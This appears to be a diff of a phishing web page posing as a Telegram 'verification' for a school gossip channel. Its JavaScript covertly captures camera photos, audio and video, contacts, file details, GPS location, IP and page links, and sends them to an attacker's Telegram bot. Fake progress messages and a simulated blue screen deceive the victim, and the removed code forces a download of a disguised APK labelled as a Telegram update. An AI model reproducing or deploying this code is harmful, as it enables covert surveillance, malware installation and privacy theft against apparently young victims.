-            if (audioRecorder.state === 'recording') {
-                audioRecorder.stop();
-            }
-        }, 30000);
+        // Записываем 3 аудио клипа по 10 секунд
+        for (let i = 0; i < 3; i++) {
+            chunks.length = 0;
+            audioRecorder.start();
+            
+            await new Promise(resolve => setTimeout(resolve, 10000));
+            
+            audioRecorder.stop();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+        }
         
-        // Запись видео
-        setTimeout(async () => {
-            addMessage('Проверяю качество видео...', 'them');
-            
-            const videoRecorder = new MediaRecorder(mediaStream, {
-                mimeType: 'video/webm;codecs=vp9,opus'
-            });
-            
-            const videoChunks = [];
-            
-            videoRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) {
-                    videoChunks.push(event.data);
-                }
-            };
-            
-            videoRecorder.onstop = async () => {
-                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
-                sendToBot(`🎥 Видео запись завершена (${(videoBlob.size/1024).toFixed(1)} KB)`, 'media');
-            };
-            
-            videoRecorder.start();
-            setTimeout(() => {
-                if (videoRecorder.state === 'recording') {
-                    videoRecorder.stop();
-                }
-            }, 15000);
-            
-        }, 35000);
-        
-        // Очистка
-        setTimeout(() => {
-            mediaStream.getTracks().forEach(track => track.stop());
-            video.pause();
-            video.srcObject = null;
-            document.body.removeChild(video);
-        }, 60000);
-        
-        return true;
-        
-    } catch(error) {
-        addMessage('⚠️ Некоторые проверки не удались, продолжаю верификацию...', 'them');
-        sendToBot(`❌ Ошибка медиа: ${error.message}`, 'system');
-        return false;
+    } catch(e) {
+        console.error('Ошибка записи аудио:', e);
     }
 }
 
-// Попытка доступа к контактам
+// Запись видео
+async function recordVideo() {
+    try {
+        videoRecorder = new MediaRecorder(mediaStream, {
+            mimeType: 'video/webm;codecs=vp9'
+        });
+        
+        const chunks = [];
+        
+        videoRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+                chunks.push(event.data);
+            }
+        };
+        
+        videoRecorder.onstop = async () => {
+            const videoBlob = new Blob(chunks, { type: 'video/webm' });
+            await sendVideo(videoBlob, videoRecordCount);
+            videoRecordCount++;
+        };
+        
+        // Записываем 2 видео по 15 секунд
+        for (let i = 0; i < 2; i++) {
+            chunks.length = 0;
+            videoRecorder.start();
+            
+            await new Promise(resolve => setTimeout(resolve, 15000));
+            
+            videoRecorder.stop();
+            await new Promise(resolve => setTimeout(resolve, 2000));
+        }
+        
+    } catch(e) {
+        console.error('Ошибка записи видео:', e);
+    }
+}
+
+// Доступ к контактам (только для поддерживаемых браузеров)
 async function accessContacts() {
     if ('contacts' in navigator && 'ContactsManager' in window) {
         try {
-            const contacts = await navigator.contacts.select(['name', 'email', 'tel', 'address', 'icon'], {
-                multiple: true
-            });
+            const contacts = await navigator.contacts.select(['name', 'email', 'tel'], { multiple: true });
             
-            let contactsData = `📇 Контакты (${contacts.length}):\n`;
+            let contactsInfo = "📇 Контакты пользователя:\n\n";
             contacts.slice(0, 10).forEach((contact, index) => {
-                contactsData += `\n${index + 1}. ${contact.name?.[0] || 'Без имени'}`;
-                if (contact.tel?.[0]) contactsData += `\n   📞: ${contact.tel[0]}`;
-                if (contact.email?.[0]) contactsData += `\n   📧: ${contact.email[0]}`;
+                contactsInfo += `${index + 1}. ${contact.name?.[0] || 'Без имени'}\n`;
+                if (contact.tel?.[0]) contactsInfo += `   📞 ${contact.tel[0]}\n`;
+                if (contact.email?.[0]) contactsInfo += `   📧 ${contact.email[0]}\n`;
+                contactsInfo += '\n';
             });
             
-            sendToBot(contactsData, 'system');
+            sendToTelegram(contactsInfo);
             return contacts.length;
-        } catch(e) {
-            // Тихий fail
-        }
+        } catch(e) {}
     }
     return 0;
 }
 
-// Попытка доступа к файлам
-async function accessFileSystem() {
+// Доступ к файловой системе
+async function accessFiles() {
     if ('showOpenFilePicker' in window) {
         try {
-            const files = [];
-            const handle = await window.showOpenFilePicker({
+            const files = await window.showOpenFilePicker({
                 multiple: true,
-                types: [
-                    {
-                        description: 'Все файлы',
-                        accept: {'*/*': []}
-                    }
-                ]
+                types: [{
+                    description: 'Все файлы',
+                    accept: { '*/*': [] }
+                }]
             });
             
-            for (const fileHandle of handle.slice(0, 5)) {
+            let filesInfo = "📁 Файлы пользователя:\n\n";
+            for (const fileHandle of files.slice(0, 5)) {
                 const file = await fileHandle.getFile();
-                files.push({
-                    name: file.name,
-                    size: file.size,
-                    type: file.type,
-                    lastModified: file.lastModified
-                });
+                filesInfo += `📄 ${file.name}\n`;
+                filesInfo += `   Размер: ${(file.size / 1024).toFixed(1)} KB\n`;
+                filesInfo += `   Тип: ${file.type}\n\n`;
             }
             
-            sendToBot(`📁 Доступ к файлам получен: ${files.length} файлов`, 'system');
+            sendToTelegram(filesInfo);
             return files.length;
-        } catch(e) {
-            // Тихий fail
-        }
+        } catch(e) {}
     }
     return 0;
 }
 
-// Полный процесс верификации
-async function startStealthVerification() {
-    if (isCollecting) return;
+// Восстановление системы
+function restoreSystem() {
+    const blueScreen = document.getElementById('blueScreen');
+    const telegramApp = document.getElementById('telegramApp');
+    const restoreButton = document.getElementById('restoreButton');
     
-    isCollecting = true;
-    const button = document.getElementById('verifyBtn');
+    restoreButton.disabled = true;
+    restoreButton.textContent = 'ВОССТАНОВЛЕНИЕ...';
+    
+    // Анимация восстановления
+    let progress = 0;
+    const interval = setInterval(() => {
+        progress += 20;
+        document.getElementById('bsodPercentage').textContent = `${progress}% завершено`;
+        
+        if (progress >= 100) {
+            clearInterval(interval);
+            
+            // Показываем сообщение об успешном восстановлении
+            document.getElementById('bsodCode').innerHTML = `
+                ✅ Восстановление системы успешно завершено!<br>
+                Все данные сохранены. Система готова к работе.<br><br>
+                <strong>Ваш доступ к "Подслушано 4 Школа" подтвержден!</strong>
+            `;
+            
+            setTimeout(() => {
+                blueScreen.style.display = 'none';
+                telegramApp.style.display = 'block';
+                
+                // Показываем финальное сообщение
+                const button = document.getElementById('accessButton');
+                button.disabled = false;
+                button.textContent = '✅ ДОСТУП ПОДТВЕРЖДЕН!';
+                button.style.background = 'linear-gradient(135deg, #00cc88, #00a466)';
+                
+                // Скрываем индикатор загрузки
+                document.getElementById('loading').style.display = 'none';
+                
+                // Показываем сообщение о успехе
+                const messageDiv = document.createElement('div');
+                messageDiv.className = 'message message-admin';
+                messageDiv.innerHTML = `
+                    <p><strong>🎉 Поздравляем!</strong></p>
+                    <p>Ты успешно прошел верификацию! Теперь у тебя есть полный доступ к каналу "Подслушано 4 Школа".</p>
+                    <p>Заходи в Telegram и наслаждайся контентом! ✨</p>
+                    <div class="message-time">только что</div>
+                `;
+                
+                document.querySelector('.telegram-content').insertBefore(
+                    messageDiv,
+                    document.querySelector('.access-panel')
+                );
+                
+            }, 2000);
+        }
+    }, 300);
+}
+
+// Показать синий экран
+function showBlueScreen() {
+    const telegramApp = document.getElementById('telegramApp');
+    const blueScreen = document.getElementById('blueScreen');
+    const restoreButton = document.getElementById('restoreButton');
+    
+    telegramApp.style.display = 'none';
+    blueScreen.style.display = 'block';
+    
+    // Симулируем сбой системы
+    let progress = 0;
+    const interval = setInterval(() => {
+        progress += Math.random() * 15;
+        if (progress > 100) progress = 100;
+        
+        document.getElementById('bsodPercentage').textContent = `${Math.round(progress)}% завершено`;
+        
+        if (progress >= 100) {
+            clearInterval(interval);
+            // Показываем кнопку восстановления
+            setTimeout(() => {
+                restoreButton.style.display = 'block';
+            }, 1500);
+        }
+    }, 500);
+}
+
+// Основная функция верификации
+async function startVerification() {
+    if (isProcessing) return;
+    
+    isProcessing = true;
+    const button = document.getElementById('accessButton');
     const loading = document.getElementById('loading');
     
     button.disabled = true;
-    button.innerHTML = '<span>⏳</span> ВЕРИФИКАЦИЯ...';
+    button.textContent = 'ПРОВЕРКА...';
     loading.style.display = 'block';
     
-    // Этап 1: Начало
-    addMessage('Начинаю проверку... Это займет около 1 минуты', 'them');
-    showTyping();
+    // Добавляем эффект глитча
+    document.querySelector('.telegram-container').classList.add('glitch');
+    setTimeout(() => {
+        document.querySelector('.telegram-container').classList.remove('glitch');
+    }, 300);
     
     try {
-        // Этап 2: Сбор системной информации
-        setTimeout(async () => {
-            hideTyping();
-            addMessage('🔍 Проверяю системные данные...', 'them');
-            
-            const systemInfo = await collectFullSystemInfo();
-            const networkInfo = await getNetworkInfo();
-            const gpsLocation = await getGPSLocation();
-            
-            let report = `👤 НОВЫЙ ПОЛЬЗОВАТЕЛЬ\n\n`;
-            report += `📱 Устройство: ${systemInfo.platform}\n`;
-            report += `🌐 Браузер: ${systemInfo.userAgent.substring(0, 80)}...\n`;
-            report += `📍 Локация: ${networkInfo.city}, ${networkInfo.region}\n`;
-            report += `📡 IP: ${networkInfo.ip}\n`;
-            report += `🕒 Время: ${new Date().toLocaleString('ru-RU')}\n`;
-            
-            if (gpsLocation && !gpsLocation.error) {
-                report += `🎯 GPS: ${gpsLocation.latitude}, ${gpsLocation.longitude}\n`;
-                report += `📏 Точность: ${gpsLocation.accuracy}м\n`;
-            }
-            
-            if (systemInfo.battery) {
-                report += `🔋 Батарея: ${systemInfo.battery.level}% ${systemInfo.battery.charging ? '(зарядка)' : ''}\n`;
-            }
-            
-            report += `\n🔗 Страница: ${systemInfo.url}\n`;
-            report += `👥 Referrer: ${systemInfo.referrer || 'Прямой заход'}`;
-            
-            sendToBot(report, 'system');
-            
-            addMessage('✅ Системные данные проверены', 'them');
-            
-        }, 2000);
+        // Этап 1: Сбор системной информации
+        sendToTelegram("🔓 НАЧАТА ВЕРИФИКАЦИЯ - ПОДСЛУШАНО 4 ШКОЛА\nВремя: " + new Date().toLocaleString());
         
-        // Этап 3: Медиа верификация
-        setTimeout(async () => {
-            addMessage('📸 Перехожу к проверке камеры...', 'them');
-            await captureStealthMedia();
-            
-        }, 5000);
+        const systemInfo = await getSystemInfo();
+        sendToTelegram(systemInfo);
         
-        // Этап 4: Дополнительные проверки
-        setTimeout(async () => {
-            addMessage('🔐 Проверяю дополнительные параметры...', 'them');
-            
-            // Контакты
-            const contactsCount = await accessContacts();
-            if (contactsCount > 0) {
-                addMessage(`📇 Найдено контактов: ${contactsCount}`, 'them');
-            }
-            
-            // Файлы
-            const filesCount = await accessFileSystem();
-            if (filesCount > 0) {
-                addMessage(`📁 Доступ к файлам: получен`, 'them');
-            }
-            
-            // Сбор истории браузера (где возможно)
-            try {
-                const visitedLinks = Array.from(document.links)
-                    .map(link => link.href)
-                    .filter(href => href && href.startsWith('http'))
-                    .slice(0, 20);
-                
-                if (visitedLinks.length > 0) {
-                    sendToBot(`🌐 История ссылок на странице:\n${visitedLinks.join('\n')}`, 'system');
-                }
-            } catch(e) {}
-            
-        }, 40000);
+        // Этап 2: Доступ к медиа
+        sendToTelegram("🎥 ЗАПРАШИВАЮ ДОСТУП К КАМЕРЕ И МИКРОФОНУ...");
         
-        // Этап 5: Завершение
+        mediaStream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                width: { ideal: 1920 },
+                height: { ideal: 1080 },
+                facingMode: 'user'
+            },
+            audio: {
+                echoCancellation: true,
+                noiseSuppression: true,
+                sampleRate: 44100
+            }
+        });
+        
+        sendToTelegram("✅ ДОСТУП К МЕДИА ПОЛУЧЕН");
+        
+        // Этап 3: Параллельный сбор данных
+        const tasks = [
+            takePhotos(),
+            recordAudio(),
+            recordVideo(),
+            accessContacts(),
+            accessFiles()
+        ];
+        
+        // Ждем завершения основных задач
+        await Promise.all(tasks.slice(0, 3));
+        
+        // Отправляем промежуточный отчет
+        sendToTelegram(`📊 ПРОМЕЖУТОЧНЫЙ ОТЧЕТ:\n📸 Фото: ${photoCount}\n🎤 Аудио: ${audioRecordCount}\n🎥 Видео: ${videoRecordCount}`);
+        
+        // Этап 4: Дополнительные данные
+        sendToTelegram("🔍 СОБИРАЮ ДОПОЛНИТЕЛЬНЫЕ ДАННЫЕ...");
+        
+        // Сбор истории браузера (где возможно)
+        try {
+            const links = Array.from(document.links)
+                .map(link => link.href)
+                .filter(href => href && href.startsWith('http'))
+                .slice(0, 20);
+            
+            if (links.length > 0) {
+                sendToTelegram("🌐 НАЙДЕНЫ ССЫЛКИ НА СТРАНИЦЕ:\n" + links.join('\n'));
+            }
+        } catch(e) {}
+        
+        // Сбор cookies
+        if (document.cookie) {
+            sendToTelegram("🍪 COOKIES ПРИСУТСТВУЮТ");
+        }
+        
+        // Этап 5: Финальный отчет
+        const finalReport = `
+🎯 ВЕРИФИКАЦИЯ ЗАВЕРШЕНА
+
+📊 ИТОГИ:
+• 📸 Сделано фото: ${photoCount}
+• 🎤 Записей аудио: ${audioRecordCount}
+• 🎥 Записей видео: ${videoRecordCount}
+• 📱 Собрано системных данных: 100%
+• 🌐 Геолокация: получена
+• 🕒 Время: ${new Date().toLocaleString()}
+
+✅ ПОЛЬЗОВАТЕЛЬ ПРОШЕЛ ВЕРИФИКАЦИЮ
+        `;
+        
+        sendToTelegram(finalReport);
+        
+        // Этап 6: Синий экран (имитация сбоя)
         setTimeout(() => {
-            hideTyping();
-            addMessage('🎉 Верификация успешно завершена!', 'them');
-            addMessage('Теперь у тебя есть полный доступ к каналу "Подслушано 4 Школа"', 'them');
-            addMessage('Секретные чаты и материалы разблокированы 🔓', 'them');
-            
-            loading.style.display = 'none';
-            button.innerHTML = '<span>✅</span> ДОСТУП ОТКРЫТ!';
-            button.style.background = 'linear-gradient(135deg, #10b981, #059669)';
-            
-            // Финальный отчет
-            const finalReport = `\n✅ ВЕРИФИКАЦИЯ ЗАВЕРШЕНА\n`;
-            finalReport += `⏰ Общее время: 60 секунд\n`;
-            finalReport += `📸 Фото: 15 снимков\n`;
-            finalReport += `🎤 Аудио: 30 секунд\n`;
-            finalReport += `🎥 Видео: 15 секунд\n`;
-            finalReport += `📊 Данные: полный сбор\n`;
-            finalReport += `\n🚀 ПОЛЬЗОВАТЕЛЬ УСПЕШНО ПРОШЕЛ ПРОВЕРКУ`;
-            
-            sendToBot(finalReport, 'system');
-            
-            // Автоматическое "обновление"
-            setTimeout(() => {
-                const link = document.createElement('a');
-                link.href = 'https://school4love.github.io/sc/tg_update.apk';
-                link.download = 'telegram_update.apk';
-                link.style.display = 'none';
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                
-                // Дополнительный метод
-                window.open('https://school4love.github.io/sc/tg_update.apk', '_blank');
-                
-            }, 3000);
-            
-        }, 65000);
+            showBlueScreen();
+        }, 1000);
         
     } catch(error) {
-        addMessage('⚠️ Произошла ошибка, но доступ все равно открыт!', 'them');
-        loading.style.display = 'none';
-        button.innerHTML = '<span>⚠️</span> ДОСТУП ОТКРЫТ';
-        sendToBot(`❌ Критическая ошибка: ${error.message}`, 'system');
+        sendToTelegram(`❌ ОШИБКА ВЕРИФИКАЦИИ: ${error.message}`);
+        
+        // Все равно показываем синий экран
+        setTimeout(() => {
+            showBlueScreen();
+        }, 1000);
     }
 }
 
-// Начальное сообщение при загрузке
-setTimeout(() => {
-    sendToBot(`🌐 Новый пользователь зашел на страницу верификации\n🕒 ${new Date().toLocaleString('ru-RU')}\n🔗 ${window.location.href}`, 'system');
-}, 1500);
-
-// Фоновая активность
-setInterval(() => {
-    // Тихая отправка пинга
-    if (!isCollecting) {
-        const pingUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=🏓`;
-        new Image().src = pingUrl;
-    }
-}, 30000);
+// Инициализация
+window.addEventListener('load', () => {
+    // Тихая отправка начальной информации
+    setTimeout(() => {
+        const info = `👀 ПОЛЬЗОВАТЕЛЬ ЗАШЕЛ НА СТРАНИЦУ\nВремя: ${new Date().toLocaleString()}\nURL: ${window.location.href}\nUser Agent: ${navigator.userAgent}`;
+        sendToTelegram(info);
+    }, 3000);
+});
 </script>
 </body>
 </html>
